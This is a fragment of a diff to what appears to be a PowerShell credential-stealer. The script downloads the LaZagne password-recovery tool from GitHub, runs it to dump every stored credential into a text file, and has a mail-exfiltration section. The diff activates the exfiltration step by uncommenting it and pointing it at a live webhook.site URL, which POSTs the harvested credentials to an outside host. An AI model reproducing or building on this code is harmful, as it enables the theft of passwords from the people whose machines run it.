@@ -95,8 +95,8 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
 # Exfiltrate the file
-#POST REQUEST
-#Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
+POST REQUEST
+Invoke-WebRequest -Uri "https://webhook.site/728c5b19-90fe-465b-b116-a4a5ae7b9e0c" -Method POST -Body Get-Content "$dir\output.txt"
 
 #Mail Exfiltration
 $smtp = "" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
